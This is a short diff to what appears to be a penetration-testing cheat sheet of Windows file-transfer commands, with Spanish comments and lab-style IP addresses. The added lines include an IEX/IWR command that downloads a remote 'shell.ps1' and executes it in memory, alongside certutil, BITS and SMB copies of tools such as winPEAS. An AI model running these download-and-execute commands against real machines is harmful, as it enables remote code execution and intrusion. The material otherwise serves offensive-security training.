@@ -85,6 +85,8 @@ Invoke-WebRequest -Uri $url -OutFile $dest
 certutil.exe -f -urlcache -split http://ip/file file
 wget URL -UseBasicParsing -OutFile FILE
 Start-BitsTransfer -Source $url -Destination $dest 
+IEX( IWR http://10.10.14.14:8000/shell.ps1 -UseBasicParsing)
+iwr http://10.10.14.14:8000/otro.ps1 -OutFile otro.ps1
 
 # copiar archivos desde compartida
 c:\tmp>copy \\10.11.14.106\smbfolder\winPEAS.exe winPEAS.exe
